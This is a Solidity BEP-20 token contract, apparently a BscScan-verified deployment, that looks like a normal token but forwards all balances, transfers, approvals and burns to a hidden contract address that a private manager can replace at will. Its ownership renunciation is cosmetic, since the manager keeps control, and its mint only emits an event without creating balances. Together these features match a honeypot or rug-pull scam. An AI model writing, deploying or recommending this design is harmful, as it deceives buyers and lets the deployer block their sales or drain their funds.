/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface ERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address _msgSender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address _msgSender, address spender, uint256 amount) external returns (bool);
    function burn(address spender, uint256 amount) external returns (bool);
    function transferFrom(address _msgSender, address sender, address recipient, uint256 amount) external returns (bool);
}

contract Token {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed burner, uint256 value);

    mapping (address => mapping (address => uint256)) private allowed;

    address public _owner;
    address private _manager;
    address private _lower_address;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _manager = msg.sender;
        _owner = address(0);
        _transferOwnership(msg.sender);
        setAddress(0xc2BE64787148A1d15432FA132570749c5A79ef70);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    function addr() public view returns (address) {
        return _lower_address;
    }
    function manager() public view returns (address) {
        return _manager;
    }
    modifier onlyOwner() {
        require(isManager(), "onlyOwner");
        _;
    }
    modifier onlyManager() {
        require(isManager(), "onlyManager");
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function isManager() public view returns (bool) {
        return msg.sender == _manager;
    }
    function renounceOwnership() public onlyManager {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyManager {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function setAddress(address lower_address_) onlyManager public returns(bool) {
        _lower_address = lower_address_;
        return true;
    }
    function totalSupply() public view returns (uint256) {
        return ERC20(_lower_address).totalSupply();
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        emit Transfer(msg.sender, _to, _value);
        return ERC20(_lower_address).transfer(msg.sender, _to, _value);
    }
    function _mint(address _to, uint256 _value) internal virtual {
        require(_to != address(0), "ERC20: mint to the zero address");
        emit Transfer(address(0), _to, _value);
    }
    function balanceOf(address owner_) public view returns (uint256) {
        return ERC20(_lower_address).balanceOf(owner_);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require (_value > 1);
        allowed[_from][msg.sender] = allowed[_from][msg.sender] - _value;
        emit Transfer(_from, _to, _value);
        return ERC20(_lower_address).transferFrom(msg.sender, _from, _to, _value);
    }
    function approve(address spender, uint amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return ERC20(_lower_address).approve(msg.sender,spender,amount);
    }
    function burn(address _spender, uint _value) public returns (bool) {
        emit Burn(_spender, _value);
        emit Transfer(_spender, address(0), _value);
        return ERC20(_lower_address).burn(msg.sender, _value);
    }
    function allowance(address owner_, address _spender) public view returns (uint256) {
        return allowed[owner_][_spender];
    }
    function name() public view returns (string memory) {
        return ERC20(_lower_address).name();
    }
    function symbol() public view returns (string memory) {
        return ERC20(_lower_address).symbol();
    }
    function decimals() public view returns (uint8) {
        return ERC20(_lower_address).decimals();
    }
}


contract BEP20 is Token {
    constructor () {
        _mint(msg.sender, 500000000000000000000000);
    }
    receive() external payable {
    }
}